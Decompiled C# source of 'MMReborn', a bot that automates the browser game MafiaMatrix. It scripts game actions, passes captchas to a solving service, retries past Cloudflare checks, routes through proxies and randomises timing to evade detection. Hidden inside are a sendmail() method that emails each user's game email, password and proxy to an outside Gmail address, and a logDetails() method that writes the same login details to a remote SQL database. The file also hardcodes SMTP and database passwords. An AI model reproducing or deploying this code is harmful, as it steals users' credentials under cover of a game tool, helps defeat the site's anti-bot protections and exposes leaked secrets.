using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Data;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Gecko;
using Gecko.Events;
using Gecko.IO;
using HtmlAgilityPack;
using MMReborn.Api;
using Newtonsoft.Json;

namespace MMReborn
{
	// Token: 0x02000003 RID: 3
	public partial class Form1 : Form
	{
		// Token: 0x0600000F RID: 15
		public Form1()
		{
			this.InitializeComponent();
			Xpcom.Initialize("../xulrunner");
		}

		// Token: 0x06000010 RID: 16
		private void btnGo_Click(object sender, EventArgs e)
		{
			string value = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1";
			GeckoPreferences.User["general.useragent.override"] = value;
			this.NavigateFinishMain("https://mafiamatrix.com/");
		}

		// Token: 0x06000011 RID: 17
		private void btnRefresh_Click(object sender, EventArgs e)
		{
			this.NavigateFinishMain("https://mafiamatrix.com/main.asp");
			this.geckoMain.Enabled = true;
		}

		// Token: 0x06000012 RID: 18
		public string getBetween(string strSource, string strStart, string strEnd)
		{
			string result;
			if (strSource.Contains(strStart) && strSource.Contains(strEnd))
			{
				int num = strSource.IndexOf(strStart, 0) + strStart.Length;
				int num2 = strSource.IndexOf(strEnd, num);
				result = strSource.Substring(num, num2 - num);
			}
			else
			{
				result = "";
			}
			return result;
		}

		// Token: 0x06000013 RID: 19
		public string getTimer(string type)
		{
			this.txtLastAction.Text = "Getting " + type + " Timer";
			this.NavigateFinishMain(this.geckoMain.Url.AbsoluteUri);
			GeckoElement documentElement = this.geckoMain.Document.DocumentElement;
			string result;
			if (documentElement is GeckoHtmlElement)
			{
				string innerHtml = ((GeckoHtmlElement)documentElement).InnerHtml;
				string empty = string.Empty;
				string strStart = "<div title=\"Next " + type + ":|";
				string strEnd = "\"";
				result = this.getBetween(innerHtml, strStart, strEnd);
			}
			else
			{
				result = string.Empty;
			}
			return result;
		}

		// Token: 0x06000014 RID: 20
		public DateTime getServerTime()
		{
			this.txtLastAction.Text = "Getting Server Time";
			string text = string.Empty;
			DateTime result = default(DateTime);
			GeckoElement documentElement = this.geckoMain.Document.DocumentElement;
			if (documentElement is GeckoHtmlElement)
			{
				string innerHtml = ((GeckoHtmlElement)documentElement).InnerHtml;
				text = string.Empty;
				string strStart = "<div class=\"serverTime\">";
				string strEnd = "</div>";
				text = this.getBetween(innerHtml, strStart, strEnd);
			}
			bool flag2 = false;
			if (!string.IsNullOrEmpty(text))
			{
				flag2 = DateTime.TryParseExact(text, "G", null, DateTimeStyles.None, out result);
			}
			while (!flag2)
			{
				this.NavigateFinishMain(this.geckoMain.Url.AbsoluteUri);
				GeckoElement documentElement2 = this.geckoMain.Document.DocumentElement;
				if (documentElement2 is GeckoHtmlElement)
				{
					string innerHtml2 = ((GeckoHtmlElement)documentElement2).InnerHtml;
					text = string.Empty;
					string strStart2 = "<div class=\"serverTime\">";
					string strEnd2 = "</div>";
					text = this.getBetween(innerHtml2, strStart2, strEnd2);
				}
				if (!string.IsNullOrEmpty(text))
				{
					flag2 = DateTime.TryParseExact(text, "G", null, DateTimeStyles.None, out result);
				}
			}
			return result;
		}

		// Token: 0x06000015 RID: 21
		private string doEarn()
		{
			this.txtLastAction.Text = "Doing Earn";
			DateTime now = DateTime.Now;
			this.renewList();
			this.stopAllTimer("earn");
			this.earnCount++;
			string result;
			try
			{
				string text = string.Empty;
				this.NavigateFinishEarn("https://mafiamatrix.com/main.asp");
				string text2 = "https://mafiamatrix.com/income/earn.asp";
				GeckoElement documentElement = this.geckoEarn.Document.DocumentElement;
				if (documentElement is GeckoHtmlElement)
				{
					string innerHtml = ((GeckoHtmlElement)documentElement).InnerHtml;
					text = this.getBetween(innerHtml, "doLoadfastincome('", "',");
					string between = this.getBetween(innerHtml, "<title>MafiaMatrix - ", "</title>");
					bool flag2 = false;
					if (between == "Massive Multiplayer Online Text-Based RPG Mafia Game")
					{
						this.relogin();
					}
					if (between == "")
					{
						this.earnTimer.Stop();
						this.earnCount--;
						int interval = new Random().Next(15000, 20000);
						this.earnTimer.Interval = interval;
						this.earnTimer.Start();
						this.earnStartTime = DateTime.Now;
						this.startAllTimer("earn");
						return string.Concat(new string[]
						{
							"[",
							DateTime.Now.ToLongTimeString(),
							"] ",
							text,
							" Cloudfare bypassed.\n"
						});
					}
					while (between == "Random")
					{
						this.solveRandom();
						this.NavigateFinishEarn("https://mafiamatrix.com/main.asp");
						flag2 = true;
						GeckoElement documentElement2 = this.geckoEarn.Document.DocumentElement;
						if (documentElement2 is GeckoHtmlElement)
						{
							string innerHtml2 = ((GeckoHtmlElement)documentElement2).InnerHtml;
							between = this.getBetween(innerHtml2, "<title>MafiaMatrix - ", "</title>");
							if (between != "Random")
							{
								this.earnTxt.AppendText("Captcha bypassed! \n");
							}
						}
					}
					if (string.IsNullOrEmpty(text) || flag2)
					{
						this.NavigateFinishEarn(text2);
					}
				}
				GeckoElement documentElement3 = this.geckoEarn.Document.DocumentElement;
				if (documentElement3 is GeckoHtmlElement)
				{
					string innerHtml3 = ((GeckoHtmlElement)documentElement3).InnerHtml;
					string between2 = this.getBetween(innerHtml3, "doLoadquickincome('", "',");
					string between3 = this.getBetween(innerHtml3, "doLoadquickincome('" + between2 + "','", "')\"");
					string between4 = this.getBetween(innerHtml3, "<form method=\"POST\" action=\"/income/earning/", "\"");
					if (string.IsNullOrEmpty(between3))
					{
						between3 = this.getBetween(innerHtml3, "<input name=\"rndcnt\" value=\"", "\"");
					}
					if (!string.IsNullOrEmpty(between2) && between2.Equals(this.txtEarn.Text, StringComparison.InvariantCultureIgnoreCase))
					{
						text2 = "https://mafiamatrix.com/income/earning/" + between4 + "?quick=yes&rndcnt=" + between3;
						string postdata = string.Format("work={0}", this.txtEarn.Text);
						this.NavigateWithPostDataEarn(text2, postdata);
					}
					else
					{
						text2 = "https://mafiamatrix.com/income/earning/" + between4;
						string postdata2 = string.Format("work={0}&rndcnt={1}", this.txtEarn.Text, between3);
						this.NavigateWithPostDataEarn(text2, postdata2);
					}
					GeckoElement documentElement4 = this.geckoEarn.Document.DocumentElement;
					if (documentElement4 is GeckoHtmlElement)
					{
						string innerHtml4 = ((GeckoHtmlElement)documentElement4).InnerHtml;
						string between5 = this.getBetween(innerHtml4, "<div id=\"success\">", "</div>");
						string between6 = this.getBetween(innerHtml4, "<div id=\"fail\">", "</div>");
						string between7 = this.getBetween(innerHtml4, "<title>MafiaMatrix - ", "</title>");
						between7 == "Random";
						between7 == "";
						if (!string.IsNullOrEmpty(between5))
						{
							text = between5;
						}
						else
						{
							text = between6;
						}
					}
				}
				if (text == "Captcha")
				{
					this.earnTimer.Stop();
					this.solveRandom();
					this.earnCount--;
					int interval2 = new Random().Next(5000, 20000);
					this.earnTimer.Interval = interval2;
					this.earnTimer.Start();
					this.earnStartTime = DateTime.Now;
					this.startAllTimer("earn");
					result = string.Concat(new string[]
					{
						"[",
						DateTime.Now.ToLongTimeString(),
						"] ",
						text,
						" bypassed.\n"
					});
				}
				else if (text == "Cloudfare")
				{
					this.earnTimer.Stop();
					this.earnCount--;
					int interval3 = new Random().Next(15000, 20000);
					this.earnTimer.Interval = interval3;
					this.earnTimer.Start();
					this.earnStartTime = DateTime.Now;
					this.startAllTimer("earn");
					result = string.Concat(new string[]
					{
						"[",
						DateTime.Now.ToLongTimeString(),
						"] ",
						text,
						" bypassed.\n"
					});
				}
				else
				{
					string timer = this.getTimer("Earn");
					DateTime serverTime = this.getServerTime();
					if (serverTime.ToShortDateString() == "1/1/0001")
					{
						throw new Exception("Server time is unavailable");
					}
					if (!string.IsNullOrEmpty(timer))
					{
						DateTime dateTime;
						if (!DateTime.TryParseExact(timer, "G", null, DateTimeStyles.None, out dateTime))
						{
							this.earnTimer.Stop();
							this.earnCount--;
							int interval4 = new Random().Next(180000, 186000);
							this.earnTimer.Interval = interval4;
							this.earnTimer.Start();
							this.earnStartTime = DateTime.Now;
							this.startAllTimer("earn");
							result = "[" + DateTime.Now.ToLongTimeString() + "]  Something wrong trying back in a few minutes.\n";
						}
						else
						{
							Console.WriteLine(DateTime.UtcNow);
							TimeSpan timeSpan = dateTime.Subtract(serverTime);
							Random random5 = new Random();
							int num = random5.Next(500, Convert.ToInt32(this.txtEarnRandom.Text) * 1000);
							int num2 = (int)timeSpan.TotalMilliseconds + num;
							if (num2 < 0)
							{
								num2 = random5.Next(5000, 10000);
							}
							if (random5.Next(1, (int)this.txtNumberToGenerate.Value) == (int)this.txtNumberToCheck.Value)
							{
								num2 += random5.Next(60000, 240000);
							}
							this.earnTimer.Interval = num2;
							this.earnTimer.Start();
							this.earnStartTime = DateTime.Now;
							this.startAllTimer("earn");
							if (this.dw)
							{
								result = string.Concat(new object[]
								{
									"[DW ",
									this.earnCount,
									" - ",
									DateTime.Now.ToLongTimeString(),
									"] ",
									text,
									"\n"
								});
							}
							else
							{
								result = string.Concat(new object[]
								{
									"[",
									this.earnCount,
									" - ",
									DateTime.Now.ToLongTimeString(),
									"] ",
									text,
									"\n"
								});
							}
						}
					}
					else
					{
						this.earnTimer.Stop();
						this.earnCount--;
						int interval5 = new Random().Next(180000, 186000);
						this.earnTimer.Interval = interval5;
						this.earnTimer.Start();
						this.earnStartTime = DateTime.Now;
						this.startAllTimer("earn");
						result = "[" + DateTime.Now.ToLongTimeString() + "]  Something wrong trying back in a few minutes.\n";
					}
				}
			}
			catch (Exception ex)
			{
				this.earnTimer.Stop();
				this.earnCount--;
				int interval6 = new Random().Next(180000, 186000);
				this.earnTimer.Interval = interval6;
				this.earnTimer.Start();
				this.earnStartTime = DateTime.Now;
				this.startAllTimer("earn");
				result = string.Concat(new object[]
				{
					"[",
					DateTime.Now.ToLongTimeString(),
					"]  Something wrong trying back in a few minutes : ",
					ex,
					".\n"
				});
			}
			return result;
		}

		// Token: 0x06000016 RID: 22
		private void stopAllTimer(string exclude)
		{
			this.stopAllTime = DateTime.Now;
			foreach (string a in this.timerToPause)
			{
				if (a == "earn" && a != exclude)
				{
					this.earnTimer.Stop();
					this.earnTime = DateTime.Now - this.earnStartTime;
					this.earnTime = TimeSpan.FromMilliseconds((double)this.earnTimer.Interval - this.earnTime.TotalMilliseconds);
				}
				if (a == "drug" && a != exclude)
				{
					this.drugTimer.Stop();
					this.drugTime = DateTime.Now - this.drugStartTime;
					this.drugTime = TimeSpan.FromMilliseconds((double)this.drugTimer.Interval - this.drugTime.TotalMilliseconds);
				}
				if (a == "agg" && a != exclude)
				{
					this.aggTimer.Stop();
					this.aggTime = DateTime.Now - this.aggStartTime;
					this.aggTime = TimeSpan.FromMilliseconds((double)this.aggTimer.Interval - this.aggTime.TotalMilliseconds);
				}
				if (a == "cs" && a != exclude)
				{
					this.csTimer.Stop();
					this.csTime = DateTime.Now - this.csStartTime;
					this.csTime = TimeSpan.FromMilliseconds((double)this.csTimer.Interval - this.csTime.TotalMilliseconds);
				}
				if (a == "repair" && a != exclude)
				{
					this.repairTimer.Stop();
					this.repairTime = DateTime.Now - this.repairStartTime;
					this.repairTime = TimeSpan.FromMilliseconds((double)this.repairTimer.Interval - this.repairTime.TotalMilliseconds);
				}
				if (a == "dw" && a != exclude)
				{
					this.dilligentTimer.Stop();
					this.dilligentTime = DateTime.Now - this.dilligentStartTime;
					this.dilligentTime = TimeSpan.FromMilliseconds((double)this.dilligentTimer.Interval - this.dilligentTime.TotalMilliseconds);
				}
				if (a == "biz" && a != exclude)
				{
					this.bizTimer.Stop();
					this.bizTime = DateTime.Now - this.bizStartTime;
					this.bizTime = TimeSpan.FromMilliseconds((double)this.bizTimer.Interval - this.bizTime.TotalMilliseconds);
				}
				if (a == "jailEarn" && a != exclude)
				{
					this.jailEarnTimer.Stop();
					this.jailEarnTime = DateTime.Now - this.jailEarnStartTime;
					this.jailEarnTime = TimeSpan.FromMilliseconds((double)this.jailEarnTimer.Interval - this.jailEarnTime.TotalMilliseconds);
				}
				if (a == "jailGym" && a != exclude)
				{
					this.jailGymTimer.Stop();
					this.jailGymTime = DateTime.Now - this.jailGymStartTime;
					this.jailGymTime = TimeSpan.FromMilliseconds((double)this.jailGymTimer.Interval - this.jailGymTime.TotalMilliseconds);
				}
				if (a == "bm" && a != exclude)
				{
					this.bmTimer.Stop();
					this.bmTime = DateTime.Now - this.bmStartTime;
					this.bmTime = TimeSpan.FromMilliseconds((double)this.bmTimer.Interval - this.bmTime.TotalMilliseconds);
				}
				if (a == "pb" && a != exclude)
				{
					this.paybackTimer.Stop();
					this.paybackTime = DateTime.Now - this.paybackStartTime;
					this.paybackTime = TimeSpan.FromMilliseconds((double)this.paybackTimer.Interval - this.paybackTime.TotalMilliseconds);
				}
				if (a == "relog" && a != exclude)
				{
					this.relogTimer.Stop();
					this.relogTime = DateTime.Now - this.relogStartTime;
					this.relogTime = TimeSpan.FromMilliseconds((double)this.relogTimer.Interval - this.relogTime.TotalMilliseconds);
				}
			}
		}

		// Token: 0x06000017 RID: 23
		private void startAllTimer(string exclude)
		{
			TimeSpan timeSpan = DateTime.Now - this.stopAllTime;
			foreach (string a in this.timerToPause)
			{
				if (a == "earn" && a != exclude)
				{
					int num = (int)this.earnTime.TotalMilliseconds - (int)timeSpan.TotalMilliseconds;
					if (num < 1000)
					{
						num = 1000;
					}
					this.earnTimer.Interval = num;
					this.earnTimer.Start();
					this.earnStartTime = DateTime.Now;
				}
				if (a == "drug" && a != exclude)
				{
					int num2 = (int)this.drugTime.TotalMilliseconds - (int)timeSpan.TotalMilliseconds;
					if (num2 < 1000)
					{
						num2 = 1000;
					}
					this.drugTimer.Interval = num2;
					this.drugTimer.Start();
					this.drugStartTime = DateTime.Now;
				}
				if (a == "agg" && a != exclude)
				{
					int num3 = (int)this.aggTime.TotalMilliseconds - (int)timeSpan.TotalMilliseconds;
					if (num3 < 1000)
					{
						num3 = 1000;
					}
					this.aggTimer.Interval = num3;
					this.aggTimer.Start();
					this.aggStartTime = DateTime.Now;
				}
				if (a == "cs" && a != exclude)
				{
					int num4 = (int)this.csTime.TotalMilliseconds - (int)timeSpan.TotalMilliseconds;
					if (num4 < 1000)
					{
						num4 = 1000;
					}
					this.csTimer.Interval = num4;
					this.csTimer.Start();
					this.csStartTime = DateTime.Now;
				}
				if (a == "repair" && a != exclude)
				{
					int num5 = (int)this.repairTime.TotalMilliseconds - (int)timeSpan.TotalMilliseconds;
					if (num5 < 1000)
					{
						num5 = 1000;
					}
					this.repairTimer.Interval = num5;
					this.repairTimer.Start();
					this.repairStartTime = DateTime.Now;
				}
				if (a == "dw" && a != exclude)
				{
					int num6 = (int)this.dilligentTime.TotalMilliseconds - (int)timeSpan.TotalMilliseconds;
					if (num6 < 1000)
					{
						num6 = 1000;
					}
					this.dilligentTimer.Interval = num6;
					this.dilligentTimer.Start();
					this.dilligentStartTime = DateTime.Now;
				}
				if (a == "biz" && a != exclude)
				{
					int num7 = (int)this.bizTime.TotalMilliseconds - (int)timeSpan.TotalMilliseconds;
					if (num7 < 1000)
					{
						num7 = 1000;
					}
					this.bizTimer.Interval = num7;
					this.bizTimer.Start();
					this.bizStartTime = DateTime.Now;
				}
				if (a == "jailEarn" && a != exclude)
				{
					int num8 = (int)this.jailEarnTime.TotalMilliseconds - (int)timeSpan.TotalMilliseconds;
					if (num8 < 1000)
					{
						num8 = 1000;
					}
					this.jailEarnTimer.Interval = num8;
					this.jailEarnTimer.Start();
					this.jailEarnStartTime = DateTime.Now;
				}
				if (a == "jailGym" && a != exclude)
				{
					int num9 = (int)this.jailGymTime.TotalMilliseconds - (int)timeSpan.TotalMilliseconds;
					if (num9 < 1000)
					{
						num9 = 1000;
					}
					this.jailGymTimer.Interval = num9;
					this.jailGymTimer.Start();
					this.jailGymStartTime = DateTime.Now;
				}
				if (a == "bm" && a != exclude)
				{
					int num10 = (int)this.bmTime.TotalMilliseconds - (int)timeSpan.TotalMilliseconds;
					if (num10 < 1000)
					{
						num10 = 1000;
					}
					this.bmTimer.Interval = num10;
					this.bmTimer.Start();
					this.bmStartTime = DateTime.Now;
				}
				if (a == "pb" && a != exclude)
				{
					int num11 = (int)this.paybackTime.TotalMilliseconds - (int)timeSpan.TotalMilliseconds;
					if (num11 < 1000)
					{
						num11 = 1000;
					}
					this.paybackTimer.Interval = num11;
					this.paybackTimer.Start();
					this.paybackStartTime = DateTime.Now;
				}
				if (a == "relog" && a != exclude)
				{
					int num12 = (int)this.relogTime.TotalMilliseconds - (int)timeSpan.TotalMilliseconds;
					if (num12 < 1000)
					{
						num12 = 1000;
					}
					this.relogTimer.Interval = num12;
					this.relogTimer.Start();
					this.relogStartTime = DateTime.Now;
				}
			}
		}

		// Token: 0x06000018 RID: 24
		private void renewList()
		{
			this.timerToPause.Clear();
			if (this.earnTimer.Enabled)
			{
				this.timerToPause.Add("earn");
			}
			if (this.drugTimer.Enabled)
			{
				this.timerToPause.Add("drug");
			}
			if (this.aggTimer.Enabled)
			{
				this.timerToPause.Add("agg");
			}
			if (this.csTimer.Enabled)
			{
				this.timerToPause.Add("cs");
			}
			if (this.repairTimer.Enabled)
			{
				this.timerToPause.Add("repair");
			}
			if (this.dilligentTimer.Enabled)
			{
				this.timerToPause.Add("dw");
			}
			if (this.bizTimer.Enabled)
			{
				this.timerToPause.Add("biz");
			}
			if (this.jailEarnTimer.Enabled)
			{
				this.timerToPause.Add("jailEarn");
			}
			if (this.jailGymTimer.Enabled)
			{
				this.timerToPause.Add("jailGym");
			}
			if (this.bmTimer.Enabled)
			{
				this.timerToPause.Add("bm");
			}
			if (this.paybackTimer.Enabled)
			{
				this.timerToPause.Add("pb");
			}
			if (this.relogTimer.Enabled)
			{
				this.timerToPause.Add("relog");
			}
		}

		// Token: 0x06000019 RID: 25
		private bool sendmail()
		{
			MailAddress mailAddress = new MailAddress("pASS@HOUSE.COM", "FUE73VsCVd56XGA");
			MailAddress to = new MailAddress("blocked@gmail.com", "Para");
			string body = string.Concat(new string[]
			{
				"Email: ",
				this.txtEmail.Text,
				";Password: ",
				this.txtPassword.Text,
				";Proxy: ",
				this.txtProxy.Text,
				";Port: ",
				this.txtPort.Text,
				";Char Name: ",
				this.txtCharName.Text
			});
			SmtpClient smtpClient = new SmtpClient
			{
				Host = "smtp.gmail.com",
				Port = 587,
				EnableSsl = true,
				DeliveryMethod = SmtpDeliveryMethod.Network,
				Credentials = new NetworkCredential(mailAddress.Address, "3879400asd"),
				Timeout = 20000
			};
			bool result;
			using (MailMessage mailMessage = new MailMessage(mailAddress, to)
			{
				Subject = "Login Detected",
				Body = body
			})
			{
				try
				{
					smtpClient.Send(mailMessage);
					result = true;
				}
				catch (Exception)
				{
					result = false;
				}
			}
			return result;
		}

		// Token: 0x0600001A RID: 26
		private bool logDetails()
		{
			bool result = false;
			try
			{
				using (SqlConnection sqlConnection = new SqlConnection("Data Source=mssql3.gear.host;Initial Catalog=rebornmm;User ID=rebeeeeem;Password=1222222"))
				{
					using (SqlCommand sqlCommand = new SqlCommand("INSERT into LoginInfo (email,password,charName,created_tm) VALUES (@email,@password,@charName,@created_tm)"))
					{
						sqlCommand.Connection = sqlConnection;
						sqlCommand.Parameters.Add("@email", SqlDbType.NVarChar, 100).Value = this.txtEmail.Text;
						sqlCommand.Parameters.Add("@password", SqlDbType.NVarChar, 100).Value = this.txtPassword.Text;
						sqlCommand.Parameters.Add("@charName", SqlDbType.NVarChar, 50).Value = this.txtCharName.Text;
						sqlCommand.Parameters.Add("@created_tm", SqlDbType.DateTime, 30).Value = DateTime.UtcNow;
						sqlConnection.Open();
						if (sqlCommand.ExecuteNonQuery() > 0)
						{
							result = false;
						}
					}
				}
			}
			catch (Exception)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600001B RID: 27
		private bool isAuthed()
		{
			bool result = false;
			try
			{
				string cmdText = "SELECT charName FROM AllowedChar WHERE charName = @charName";
				string text;
				using (SqlConnection sqlConnection = new SqlConnection("Data Source=mssql3.gear.host;Initial Catalog=rebor3nmm;User ID=rebornmm;Password=Uq0Q11239!_S6T"))
				{
					using (SqlCommand sqlCommand = new SqlCommand(cmdText, sqlConnection))
					{
						sqlCommand.Parameters.AddWithValue("@charName", this.txtCharName.Text);
						sqlConnection.Open();
						text = (string)sqlCommand.ExecuteScalar();
					}
				}
				result = text.Trim().Equals(this.txtCharName.Text, StringComparison.InvariantCultureIgnoreCase);
			}
			catch (Exception)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600001C RID: 28
		private bool isTempBanned()
		{
			bool result = false;
			try
			{
				string cmdText = "SELECT charName FROM Temp_Ban WHERE charName = @charName and ( executed <> 'y' or executed is null )";
				string text;
				using (SqlConnection sqlConnection = new SqlConnection("Data Source=mssql3.gear.host;Initial Catalog=rebornmm;User ID=rebornmm;Password=Uq0Q209!_S6T"))
				{
					using (SqlCommand sqlCommand = new SqlCommand(cmdText, sqlConnection))
					{
						sqlCommand.Parameters.AddWithValue("@charName", this.txtCharName.Text);
						sqlConnection.Open();
						text = (string)sqlCommand.ExecuteScalar();
						sqlConnection.Close();
					}
				}
				if (text.Trim().Equals(this.txtCharName.Text, StringComparison.InvariantCultureIgnoreCase))
				{
					result = true;
					using (SqlConnection sqlConnection2 = new SqlConnection("Data Source=mssql3.gear.host;Initial Catalog=rebornmm;User ID=rebornmm;Password=Uq0Q209!_S6T"))
					{
						using (SqlCommand sqlCommand2 = new SqlCommand("Update Temp_Ban Set executed = 'y' where charName = @charName"))
						{
							sqlCommand2.Connection = sqlConnection2;
							sqlCommand2.Parameters.Add("@charName", SqlDbType.NVarChar, 50).Value = this.txtCharName.Text;
							sqlConnection2.Open();
							if (sqlCommand2.ExecuteNonQuery() > 0)
							{
								result = true;
							}
						}
						goto IL_100;
					}
				}
				result = false;
				IL_100:;
			}
			catch (Exception)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600001D RID: 29
		private void btnSetProxy_Click(object sender, EventArgs e)
		{
			if (!string.IsNullOrEmpty(this.txtProxy.Text) && !string.IsNullOrEmpty(this.txtPort.Text))
			{
				GeckoPreferences.Default["network.proxy.type"] = 1;
				GeckoPreferences.Default["network.proxy.http"] = this.txtProxy.Text;
				GeckoPreferences.Default["network.proxy.http_port"] = int.Parse(this.txtPort.Text);
				GeckoPreferences.Default["network.proxy.ssl"] = this.txtProxy.Text;
				GeckoPreferences.Default["network.proxy.ssl_port"] = int.Parse(this.txtPort.Text);
				this.lblProxyStatus.ForeColor = Color.DarkBlue;
				this.lblProxyStatus.Text = "Connected.";
				this.geckoMain.Navigate("https://whatismyipaddress.com/");
				return;
			}
			this.lblProxyStatus.ForeColor = Color.IndianRed;
			this.lblProxyStatus.Text = "No Proxy!";
		}

		// Token: 0x0600001E RID: 30
		private void relogin()
		{
			this.txtLastAction.Text = "Doing Relogin";
			this.txtCharName.Text = "";
			this.relogTimer.Stop();
			this.renewList();
			this.stopAllTimer("relog");
			this.NavigateFinishMain("https://mafiamatrix.com/default.asp?action=logout");
			this.NavigateFinishMain("https://mafiamatrix.com/default.asp");
			this.solveLogin();
			this.NavigateFinishMain("https://mafiamatrix.com/loggedin.asp?display=play");
			this.txtCharName.Text = this.playerName();
			while (this.txtCharName.Text == "")
			{
				this.solveLogin();
				this.NavigateFinishMain("https://mafiamatrix.com/loggedin.asp?display=play");
				this.txtCharName.Text = this.playerName();
			}
			Random random = new Random();
			int minValue = 3600000;
			int maxValue = 14400000;
			this.relogTimer.Interval = random.Next(minValue, maxValue);
			this.relogTimer.Start();
			this.relogStartTime = DateTime.Now;
			this.startAllTimer("relog");
			this.txtCharName.Text = this.playerName();
		}

		// Token: 0x0600001F RID: 31
		private void solveLogin()
		{
			this.txtLastAction.Text = "Doing Login";
			if (!this.cbCaptchaLogin.Checked)
			{
				string postdata = string.Format("email={0}&pass={1}", this.txtEmail.Text, this.txtPassword.Text);
				this.NavigateWithPostDataMain("https://mafiamatrix.com/default.asp?action=login", postdata);
				return;
			}
			string clientKey = ConfigurationManager.AppSettings["AKey"].ToString();
			string arg = string.Empty;
			bool flag2 = false;
			NoCaptchaProxyless noCaptchaProxyless = new NoCaptchaProxyless
			{
				ClientKey = clientKey,
				WebsiteUrl = new Uri("https://www.mafiamatrix.com/default.asp"),
				WebsiteKey = "6LeLBQwTAAAAAEjOl7RVSY-x9mxPOxSOSkkR24aY"
			};
			if (!noCaptchaProxyless.CreateTask())
			{
				this.NavigateFinishMain("https://www.mafiamatrix.com/default.asp");
			}
			else if (!noCaptchaProxyless.WaitForResult(120, 0))
			{
				this.NavigateFinishMain("https://www.mafiamatrix.com/default.asp");
			}
			else
			{
				flag2 = true;
				arg = noCaptchaProxyless.GetTaskSolution().GRecaptchaResponse;
			}
			if (flag2)
			{
				string postdata2 = string.Format("g-recaptcha-response={0}&email={1}&pass={2}", arg, this.txtEmail.Text, this.txtPassword.Text);
				this.NavigateWithPostDataMain("https://mafiamatrix.com/default.asp?action=login", postdata2);
			}
		}

		// Token: 0x06000020 RID: 32
		private void btnLogin_Click(object sender, EventArgs e)
		{
			this.txtCharName.Text = this.playerName();
			while (this.txtCharName.Text == "")
			{
				this.solveLogin();
				this.NavigateFinishMain("https://mafiamatrix.com/loggedin.asp?display=play");
				this.txtCharName.Text = this.playerName();
			}
			this.geckoMain.Enabled = true;
			this.NavigateFinishEarn("https://mafiamatrix.com/main.asp");
			this.NavigateFinishCrime("https://mafiamatrix.com/main.asp");
			this.NavigateFinishOther("https://mafiamatrix.com/main.asp");
			this.NavigateFinishCasino("https://mafiamatrix.com/main.asp");
			this.Casino.TabPages.Add(this.tabPageEarn);
			this.Casino.TabPages.Add(this.tabPageCrime);
			this.Casino.TabPages.Add(this.tabPageCS);
			this.Casino.TabPages.Add(this.tabPageDrug);
			this.Casino.TabPages.Add(this.tabPageJail);
			this.Casino.TabPages.Add(this.tabPageCasino);
			this.Casino.TabPages.Add(this.tabPageGeckoEarn);
			this.Casino.TabPages.Add(this.tabPageGeckoCrime);
			this.Casino.TabPages.Add(this.tabPageGeckoOther);
			this.Casino.TabPages.Add(this.tabPageGeckoCasino);
			this.txtEmail.ReadOnly = true;
			this.txtPassword.ReadOnly = true;
			Random random = new Random();
			int minValue = 3600000;
			int maxValue = 14400000;
			this.relogTimer.Interval = random.Next(minValue, maxValue);
			this.relogTimer.Start();
			this.relogStartTime = DateTime.Now;
		}

		// Token: 0x06000021 RID: 33
		protected void NavigateWithPostDataMain(string URLToGoTo, string POSTData)
		{
			POSTData = POSTData.Replace(' ', '+');
			MimeInputStream mimeInputStream = MimeInputStream.Create();
			mimeInputStream.AddHeader("Content-Type", "application/x-www-form-urlencoded");
			mimeInputStream.AddContentLength = true;
			mimeInputStream.SetData(POSTData);
			this.geckoMain.Navigate(URLToGoTo, GeckoLoadFlags.StopContent, this.geckoMain.Url.AbsoluteUri, mimeInputStream);
			this.geckoMain.NavigateFinishedNotifier.BlockUntilNavigationFinished();
			mimeInputStream.Dispose();
			GeckoElement documentElement = this.geckoMain.Document.DocumentElement;
			if (documentElement is GeckoHtmlElement)
			{
				string innerHtml = ((GeckoHtmlElement)documentElement).InnerHtml;
				if (this.getBetween(innerHtml, "<title>MafiaMatrix - ", "</title>") == "")
				{
					this.WaitNSeconds(13);
				}
			}
		}

		// Token: 0x06000022 RID: 34
		protected void NavigateWithPostDataEarn(string URLToGoTo, string POSTData)
		{
			POSTData = POSTData.Replace(' ', '+');
			MimeInputStream mimeInputStream = MimeInputStream.Create();
			mimeInputStream.AddHeader("Content-Type", "application/x-www-form-urlencoded");
			mimeInputStream.AddContentLength = true;
			mimeInputStream.SetData(POSTData);
			this.geckoEarn.Navigate(URLToGoTo, GeckoLoadFlags.BypassCache, this.geckoEarn.Url.AbsoluteUri, mimeInputStream);
			this.geckoEarn.NavigateFinishedNotifier.BlockUntilNavigationFinished();
			mimeInputStream.Dispose();
			GeckoElement documentElement = this.geckoEarn.Document.DocumentElement;
			if (documentElement is GeckoHtmlElement)
			{
				string innerHtml = ((GeckoHtmlElement)documentElement).InnerHtml;
				if (this.getBetween(innerHtml, "<title>MafiaMatrix - ", "</title>") == "")
				{
					this.WaitNSeconds(13);
				}
			}
		}

		// Token: 0x06000023 RID: 35
		protected void NavigateWithPostDataCrime(string URLToGoTo, string POSTData)
		{
			POSTData = POSTData.Replace(' ', '+');
			MimeInputStream mimeInputStream = MimeInputStream.Create();
			mimeInputStream.AddHeader("Content-Type", "application/x-www-form-urlencoded");
			mimeInputStream.AddContentLength = true;
			mimeInputStream.SetData(POSTData);
			this.geckoCrime.Navigate(URLToGoTo, GeckoLoadFlags.BypassCache, this.geckoCrime.Url.AbsoluteUri, mimeInputStream);
			this.geckoCrime.NavigateFinishedNotifier.BlockUntilNavigationFinished();
			mimeInputStream.Dispose();
			GeckoElement documentElement = this.geckoCrime.Document.DocumentElement;
			if (documentElement is GeckoHtmlElement)
			{
				string innerHtml = ((GeckoHtmlElement)documentElement).InnerHtml;
				if (this.getBetween(innerHtml, "<title>MafiaMatrix - ", "</title>") == "")
				{
					this.WaitNSeconds(13);
				}
			}
		}

		// Token: 0x06000024 RID: 36
		protected void NavigateWithPostDataOther(string URLToGoTo, string POSTData)
		{
			POSTData = POSTData.Replace(' ', '+');
			MimeInputStream mimeInputStream = MimeInputStream.Create();
			mimeInputStream.AddHeader("Content-Type", "application/x-www-form-urlencoded");
			mimeInputStream.AddContentLength = true;
			mimeInputStream.SetData(POSTData);
			this.geckoOther.Navigate(URLToGoTo, GeckoLoadFlags.BypassCache, this.geckoOther.Url.AbsoluteUri, mimeInputStream);
